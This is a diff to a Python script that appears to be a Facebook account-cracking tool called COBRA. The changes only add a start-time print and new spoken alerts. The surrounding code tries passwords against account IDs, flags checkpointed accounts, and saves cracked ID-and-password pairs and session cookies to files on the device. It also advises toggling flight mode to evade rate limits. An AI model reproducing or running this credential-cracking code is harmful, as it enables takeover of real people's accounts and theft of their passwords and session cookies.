@@ -427,6 +427,7 @@ def passwrd():
 	banner()
 	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;93m USER NAME\033[1;96m :\033[1;97m "+NameX)
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mTOTAL ID′S\033[1;96m :\033[0;97m '+str(len(id)))
+	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mStarting Time : ' + time.strftime("%H:%M"))
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mCloning Speed Ultra Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
 	COBRAj(f'\033[0;97m===============================================')
@@ -501,7 +502,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#COBRA-BOSS
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
-				os.system('espeak -a 300 " MUBIN, CP, ID"')
+				os.system('espeak -a 300 " Hey Boss, I have found, a, CP, ID"')
 				open('/sdcard/COBRA-CP.txt','a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -513,7 +514,7 @@ def crack(idf,pwv):
 				#COBRA-BOSS
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
-				os.system('espeak -a 300 " FIROZ,  Ok,  ID"')
+				os.system('espeak -a 300 " hello FIROZ, my boss! it′s a  Ok,  ID"')
 				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'coki'+'\n')
 				cek_apk(session,coki)
 				break
